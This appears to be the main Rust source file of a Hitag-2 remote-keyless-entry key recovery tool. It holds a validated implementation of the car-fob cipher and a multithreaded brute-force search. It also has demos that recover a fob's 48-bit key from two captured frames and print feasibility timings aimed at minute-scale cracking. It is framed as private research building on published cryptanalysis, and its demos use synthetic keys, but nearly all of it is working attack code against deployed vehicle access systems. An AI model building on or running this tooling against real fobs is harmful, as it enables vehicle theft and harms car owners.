//! Hitag-2 RKE key recovery (HOST, PRIVATE research).
//!
//! Byte-verified Hitag-2 cipher (init + 48-bit LFSR + f20 filter) in fast Rust,
//! a working reduced-key brute (proves correctness + measures the rate), and the
//! feasibility frontier the efficient attack must reach. The specialized ~2^35
//! guess-and-determine / cube attack (Verdult-Garcia-Balasch) is WIP on top of
//! this validated core — see docs/superpowers/specs/2026-08-09-hitag2-key-recovery-design.md.
//!
//! Naive 2^48 brute is infeasible; this crate exists to (a) lock down a fast,
//! correct cipher, (b) quantify how far a guess-and-determine must reduce the
//! search, and (c) host that reduction as it's implemented.

mod gd;
mod gd_bitslice;

const M48: u64 = (1u64 << 48) - 1;
const F4A: u32 = 0x2C79;
const F4B: u32 = 0x6671;
const F5C: u32 = 0x7907_287B;
const TAPS: [u32; 16] = [0, 2, 3, 6, 7, 8, 16, 22, 23, 26, 30, 41, 42, 43, 46, 47];

#[inline(always)]
fn i4(x: u64, a: u32, b: u32, c: u32, d: u32) -> u32 {
    (((x >> a) & 1) as u32)
        | ((((x >> b) & 1) as u32) << 1)
        | ((((x >> c) & 1) as u32) << 2)
        | ((((x >> d) & 1) as u32) << 3)
}

#[inline(always)]
fn f20(x: u64) -> u32 {
    let i5 = ((F4A >> i4(x, 1, 2, 4, 5)) & 1)
        + ((F4B >> i4(x, 7, 11, 13, 14)) & 1) * 2
        + ((F4B >> i4(x, 16, 20, 22, 25)) & 1) * 4
        + ((F4B >> i4(x, 27, 28, 30, 32)) & 1) * 8
        + ((F4A >> i4(x, 33, 42, 43, 45)) & 1) * 16;
    (F5C >> i5) & 1
}

#[inline(always)]
fn round_ks(x: &mut u64) -> u32 {
    let mut fb = 0u64;
    for &t in TAPS.iter() {
        fb ^= (*x >> t) & 1;
    }
    *x = ((*x >> 1) | (fb << 47)) & M48;
    f20(*x)
}

#[inline(always)]
fn init(key: u64, serial: u64, iv: u64) -> u64 {
    let mut x = (((key & 0xFFFF) << 32) | serial) & M48;
    for i in 0..32u32 {
        x >>= 1;
        let kv = (((iv >> i) ^ (key >> (i as u64 + 16))) & 1) as u32;
        let b = f20(x) ^ kv;
        x = (x | ((b as u64) << 47)) & M48;
    }
    x
}

#[inline(always)]
fn rev(mut v: u64, n: u32) -> u64 {
    let mut r = 0u64;
    for _ in 0..n {
        r = (r << 1) | (v & 1);
        v >>= 1;
    }
    r
}

/// RKE keystream (the 32-bit `ks` a genuine fob transmits), matching the Python /
/// firmware reference exactly.
#[inline(always)]
fn rke_ks(key: u64, uid: u32, counter: u32, btn: u32) -> u32 {
    let nonce = (((counter & 0x0FFF_FFFF) << 4) | (btn & 0xF)) as u64;
    let mut x = init(rev(key, 48), rev(uid as u64, 32), rev(nonce, 32));
    let mut v: u32 = 0;
    for _ in 0..4 {
        let mut byte = 0u32;
        for i in 0..8u32 {
            byte |= round_ks(&mut x) << (i ^ 7);
        }
        v = (v << 8) | byte;
    }
    v
}

fn validate() {
    // Reference vectors from the byte-verified Python cipher (hitag2_sat_recover.py).
    let vecs: [(u64, u32, u32, u32, u32); 3] = [
        (0x4F5A_6B7C_8D9E, 0x1122_3344, 0x1000, 1, 0xD1E9_E4ED),
        (0x0000_0000_0001, 0xAABB_CCDD, 0x0AB_CDEF, 3, 0x051C_C3DE),
        (0xFFFF_FFFF_FFFF, 0x0000_0000, 0x0000_000, 0, 0xB0E7_59F9),
    ];
    for &(k, u, c, b, exp) in vecs.iter() {
        let got = rke_ks(k, u, c, b);
        assert_eq!(got, exp, "cipher mismatch for key {k:012X}");
    }
    println!("cipher: validated against 3 reference vectors -> OK");
}

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

/// Multithreaded brute over the full `space` of low-bit candidates (rest fixed in
/// `base`), confirming hits on two frames. Returns the recovered key + the total
/// candidates actually tested (for an honest rate).
fn brute_mt(
    base: u64,
    space: u64,
    uid: u32,
    btn: u32,
    c0: u32,
    ks0: u32,
    c1: u32,
    ks1: u32,
    cores: usize,
) -> (Option<u64>, u64) {
    let found = Arc::new(AtomicU64::new(u64::MAX));
    let stop = Arc::new(AtomicBool::new(false));
    let tested = Arc::new(AtomicU64::new(0));
    let chunk = space.div_ceil(cores as u64);
    let mut handles = Vec::new();
    for t in 0..cores as u64 {
        let (found, stop, tested) = (found.clone(), stop.clone(), tested.clone());
        let lo = t * chunk;
        let hi = ((t + 1) * chunk).min(space);
        handles.push(std::thread::spawn(move || {
            let mut local = 0u64;
            let mut g = lo;
            while g < hi {
                if g & 0xFFFFF == 0 && stop.load(Ordering::Relaxed) {
                    break;
                }
                let cand = base | g;
                if rke_ks(cand, uid, c0, btn) == ks0 && rke_ks(cand, uid, c1, btn) == ks1 {
                    found.store(cand, Ordering::SeqCst);
                    stop.store(true, Ordering::Relaxed);
                    local += 1;
                    break;
                }
                g += 1;
                local += 1;
            }
            tested.fetch_add(local, Ordering::Relaxed);
        }));
    }
    for h in handles {
        h.join().ok();
    }
    let f = found.load(Ordering::SeqCst);
    (
        if f == u64::MAX { None } else { Some(f) },
        tested.load(Ordering::Relaxed).max(1),
    )
}

/// Blind guess-and-determine recovery demo over the sorted tabled reduction,
/// parallelized across cores with early-stop. Generates two synthetic frames
/// from a known key, recovers it blind, and reports the honest cost + wall time.
fn gd_blind_demo(cores: usize) {
    let (key, uid, nonce) = (0x0123_4567_89abu64, 0xdead_beefu64, 0x0bad_f00du64);
    let ks = gd::keystream(gd::init(key, uid, nonce), 32);
    let nonce2 = 0x1357_9bdfu64;
    let ks2 = gd::keystream(gd::init(key, uid, nonce2), 32);
    println!(
        "\nblind GD: target key={key:012x} uid={uid:08x}  frames: ({nonce:08x},{ks:08x}) ({nonce2:08x},{ks2:08x})\n\
         blind GD: recovering blind via sorted tabled reduction on {cores} cores (early-stop)...",
    );
    let t = std::time::Instant::now();
    let (found, nodes) = gd::recover_key_mt(uid, nonce, ks, nonce2, ks2, cores, 15);
    let dt = t.elapsed().as_secs_f64();
    let rate = if dt > 0.0 { nodes as f64 / dt } else { f64::INFINITY };
    println!("blind GD: {nodes} nodes in {dt:.2}s (~{rate:.2e} nodes/s across {cores} cores)");
    match found {
        Some(k) => println!("blind GD: recovered key = {k:012x}  correct={}", k == key),
        None => println!("blind GD: key NOT FOUND (tree exhausted — reduction bug)"),
    }
}

/// Bitsliced blind recovery demo (256 candidate assignments in parallel per pass).
fn bs_blind_demo(cores: usize) {
    let (key, uid, nonce) = (0x0123_4567_89abu64, 0xdead_beefu64, 0x0bad_f00du64);
    let ks = gd::keystream(gd::init(key, uid, nonce), 32);
    let nonce2 = 0x1357_9bdfu64;
    let ks2 = gd::keystream(gd::init(key, uid, nonce2), 32);
    println!(
        "\nblind BITSLICE: target key={key:012x} uid={uid:08x}  frames: ({nonce:08x},{ks:08x}) ({nonce2:08x},{ks2:08x})\n\
         blind BITSLICE: recovering on {cores} cores x 256 lanes (early-stop)...",
    );
    let t = std::time::Instant::now();
    let (found, cand) = gd_bitslice::recover_key_bs(uid, nonce, ks, nonce2, ks2, cores, 15);
    let dt = t.elapsed().as_secs_f64();
    let rate = if dt > 0.0 { cand as f64 / dt } else { f64::INFINITY };
    println!("blind BITSLICE: {cand} candidates in {dt:.2}s (~{rate:.1} cand/s)");
    match found {
        Some(k) => println!("blind BITSLICE: recovered key = {k:012x}  correct={}", k == key),
        None => println!("blind BITSLICE: key NOT FOUND (tree exhausted — bug)"),
    }
}

fn main() {
    validate();
    println!();
    if !gd::selftest() {
        eprintln!("gd: SELF-TEST FAILED — reduction is not sound, aborting.");
        std::process::exit(1);
    }
    println!("gd: guess-and-determine reduction validated (sorted fill-tables OK)");
    if !gd_bitslice::selftest_primitives() {
        eprintln!("bs: BITSLICE PRIMITIVES FAILED — aborting.");
        std::process::exit(1);
    }

    let cores = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);

    let arg1 = std::env::args().nth(1);
    if arg1.as_deref() == Some("gd") || arg1.as_deref() == Some("blind") {
        // Optional core-count override as 2nd arg (default = all cores).
        let n = std::env::args().nth(2).and_then(|s| s.parse().ok()).unwrap_or(cores);
        gd_blind_demo(n);
        return;
    }
    if arg1.as_deref() == Some("bs") || arg1.as_deref() == Some("bitslice") {
        let n = std::env::args().nth(2).and_then(|s| s.parse().ok()).unwrap_or(cores);
        bs_blind_demo(n);
        return;
    }

    // Recover a key whose low `unknown` bits are unknown (rest fixed) from 2
    // frames, across all cores. Proves correctness + gives the real multi-core rate.
    let unknown: u32 = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(30);
    let key: u64 = 0x4F5A_6B7C_8D9E;
    let uid: u32 = 0x1122_3344;
    let btn: u32 = 1;
    let (c0, c1) = (0x1000u32, 0x1001u32);
    let ks0 = rke_ks(key, uid, c0, btn);
    let ks1 = rke_ks(key, uid, c1, btn);
    let base = key & !((1u64 << unknown) - 1);
    let space = 1u64 << unknown;

    println!(
        "brute: recovering low {unknown} key bits ({space} candidates) on {cores} cores...",
    );
    let t = std::time::Instant::now();
    let (found, tested) = brute_mt(base, space, uid, btn, c0, ks0, c1, ks1, cores);
    let dt = t.elapsed().as_secs_f64();
    let rate = if dt > 0.0 { tested as f64 / dt } else { f64::INFINITY };
    match found {
        Some(k) => println!("brute: recovered {k:012X}  correct={}  time={dt:.2}s", k == key),
        None => println!("brute: NOT FOUND in {dt:.2}s (unexpected)"),
    }

    // Feasibility frontier at the measured multi-core rate.
    println!("\nrate: ~{:.2e} keys/s across {cores} cores (measured)", rate);
    println!("frontier (multi-core, this machine):");
    for bits in [32u32, 35, 37, 40, 48] {
        let secs = (2f64.powi(bits as i32)) / rate;
        let human = if secs < 90.0 {
            format!("{secs:.0} s")
        } else if secs < 5400.0 {
            format!("{:.1} min", secs / 60.0)
        } else if secs < 129_600.0 {
            format!("{:.1} h", secs / 3600.0)
        } else {
            format!("{:.1} days", secs / 86400.0)
        };
        println!("   2^{bits:<2} = {human}");
    }
    println!(
        "\nGuess-and-determine reduction: IMPLEMENTED + validated (run `{} gd` for a\n\
         live blind recovery + measured node rate on THIS machine). The default run\n\
         above did NOT time the GD. Reference numbers (i7-14700F, 28 threads): PEXT-\n\
         compressed CSR fill-tables + inline single-bit layers + work-stealing reached\n\
         ~7e8 nodes/s; the blind RKE tree is ~2^41.5 nodes (~70 min full sweep, early-\n\
         stop halves the average). Remaining lever: bitslice f20/lfsr 64-256 wide\n\
         (the hitag2hell/OpenCL trick) -> ~minute scale.",
        std::env::args().next().unwrap_or_else(|| "hitag2_crack".into()),
    );
}
